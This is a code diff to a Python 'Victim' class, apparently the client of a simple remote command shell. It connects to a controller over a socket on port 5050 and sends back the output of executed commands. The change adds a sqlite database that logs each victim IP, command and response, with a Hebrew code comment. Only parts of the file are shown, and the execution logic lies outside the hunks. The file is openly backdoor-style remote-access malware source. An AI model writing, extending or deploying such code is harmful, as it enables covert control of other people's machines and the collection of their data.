@@ -1,11 +1,13 @@
 import socket
 import subprocess
+import sqlite3
 
 
 
 class Victim:
     def __init__(self,host = socket.gethostbyname(socket.gethostname()), port = 5050):
         self.ADDR = (host, port)
+        self.IP = host
         self.FORMAT = 'utf-8'
         self.DISCONNECTED_MESSAGE = "stop"
         self.HEADER = 4096
@@ -40,6 +42,31 @@ class Victim:
             print(f"[SENDING DEBUG] sending result: {output[:50]}...")
 
             self.client_socket.send(output.encode(self.FORMAT))
+
+
+
+            connection = sqlite3.connect("save_commands.db")  # קובץ באותה תיקייה של הקוד
+            cursor = connection.cursor()
+
+            cursor.execute("""
+            CREATE TABLE IF NOT EXISTS commands (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                victim_ip TEXT,
+                command TEXT,
+                response TEXT,
+                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+            )
+            """)
+
+            sql= ("""INSERT INTO commands (victim_ip, command, response)
+                      VALUES (?, ?, ?)
+                      """)
+            values = self.IP, command, output
+
+            cursor.execute(sql,values)
+            connection.commit()
+            connection.close()
+
 
 
         self.client_socket.close()
